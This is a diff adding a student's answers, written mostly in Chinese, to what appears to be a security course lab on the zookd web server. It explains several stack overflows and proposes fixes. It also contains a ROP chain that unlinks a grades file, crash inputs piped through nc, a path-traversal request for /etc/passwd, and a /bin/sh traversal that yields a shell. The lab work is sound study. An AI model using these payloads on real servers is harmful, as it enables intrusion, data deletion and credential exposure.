@@ -1,1 +1,91 @@
 ## Place your answers here.
+
+exercise 1
+
+The same as the solution to be mentioned in exercise 5.
+
+exercise 2
+
+process_client -> http_request_headers -> url_decode
+value缓冲区只有 512 字节大小，但是 buf 长 8192 字节，有栈溢出。
+
+exercise 3
+
+使用和 exercise 2 相同的漏洞，value 的地址为 0x7fffffffda90，%rbp 的地址为 0x7fffffffdcc0，因此只要栈溢出到 0x7fffffffdcc8 就能覆盖掉返回地址。
+将 shellcode 插入到 header 的首部，shellcode 的地址即为 value 的地址，因此只需要将返回地址替换为 value 的地址即可。
+
+exercise 4 challenge
+
+$ ROPgadget --binary zookd
+0x0000000000002fb3 : pop rdi ; ret
+
+栈布局：
+    rop_payload = p64(pop_rdi_ret) + \
+            p64(filename_addr) + \
+            p64(unlink_addr)
+
+栈上从低地址到高低址放置 pop rdi;ret 地址、"/home/student/grades.txt\0"地址、unlink地址
+ret先到 pop rdi;ret 处，然后 pop rdi 弹出文件名到rdi，最后ret到unlink
+
+
+
+exercise 5
+
+1.
+process_client -> http_request_headers -> url_decode
+value缓冲区只有512字节大小，但是buf长8192字节，有栈溢出
+利用url_decode可以在value中布置任意字符，可以没有限制的进行rop
+
+exercise 2,3,4都是利用这里的漏洞
+
+修复：value的大小设为8192
+
+
+2.
+同1，envvar长512字节，也存在栈溢出
+envvar通过sprintf赋值，有'\0'截断，难以进行rop
+
+crash poc：
+$ python -c 'print "GET / HTTP/1.0\r\n"+"A"*1280+": 1"+"\r\n\r\n"' | nc 0 8080
+
+修复：envvar的大小设为8192，或者用snprintf代替sprintf
+
+
+3.
+process_client -> http_request_line -> url_decode
+process_client里定义的reqpath只有4096长，在http_request_line里面通过url_decode赋值，buf有8192长，存在栈溢出
+利用url_decode可以在reqpath中布置任意字符，可以没有限制的进行rop
+
+crash poc：
+$ python -c 'print "GET /"+"a"*6144+"/ HTTP/1.0\r\n\r\n"' | nc 0 8080
+
+修复：reqpath的大小设为8192
+
+
+4.
+process_client -> http_serve -> http_serve_directory -> dir_join
+http_serve中的pn变量长2048，对应到http_serve_directory中的name变量只有1024长
+
+字符串来源于REQUEST_URI环境变量，通过dir_join中的strcat连接造成溢出，有'\0'截断，还必须是一个真实存在的路径以通过split_path的检查，难以利用。
+
+crash_poc：
+$ python -c 'print "GET /"+"./"*768+" HTTP/1.0\r\n\r\n"' | nc 0 8080
+
+修复：name变量的大小设为2048
+
+
+5.
+process_client -> http_serve
+没有对路径进行检查，存在路径穿越，导致任意文件读取和任意程序执行
+
+任意文件读取（以/etc/passwd为例）：
+$ python -c 'print "GET /../../../../../../../../../../etc/passwd"+" HTTP/1.0\r\n\r\n"' | nc 0 8080
+
+任意程序执行并获得服务器的shell：
+$ (python -c 'print "GET /../../../../../../../../../../bin/sh"+" HTTP/1.0\r\n\r\n"' ; cat) | nc 0 8080
+exec 1>&0
+ls
+
+修复：增加检查，展开路径中所有的"./"和"../"，然后确保在DOCUMENT_ROOT内部
+（这个太麻烦了，没有在exercise6中修复）
+
